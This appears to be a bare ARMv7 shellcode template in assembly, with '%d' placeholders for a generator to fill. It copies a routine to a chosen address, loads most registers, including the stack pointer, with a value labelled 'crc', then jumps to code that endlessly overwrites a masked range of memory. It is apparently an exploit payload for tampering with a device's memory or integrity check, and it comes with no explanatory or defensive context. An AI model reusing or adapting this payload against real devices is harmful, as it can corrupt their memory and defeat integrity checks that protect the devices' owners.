.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.syntax unified
.arch armv7-a
.arm
start:
    mov r3,%d
    add r3,%d
    adr r1,write_m
    adr r0,func_end
loop:
    ldm r1!,{r4-r13}
    stm r3!,{r4-r13}
    cmp r1,r0
    blo loop
    adr r0,crc

    ldr r4,[r0]
    mov r3,r4
    mov r5,r4
    mov r6,r4
    mov r7,r4
    mov r8,r4
    mov r9,r4
    mov r10,r4
    mov r11,r4
    mov r12,r4
    mov r13,r4
    mov r14,r4
    mov r0,r4
    mov r2,%d
    add r2,%d
    mov pc,r2

write_m:
    mov r2,r4
    mov r1,0xf000
    add r1,0x10000
    mov r0,0x10000
    add r0,0xf700
    add r0,0xff
loop_m:
    stm r1!,{r2-r14}
    and r1,r0
    b loop_m
func_end:
crc:
// .ascii "\xcc\x0b\x89\xf6"
    .ascii "\x74\xd7\xf2\xd0"
//    .ascii "\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0\x74\xd7\xf2\xd0"
end:
    nop
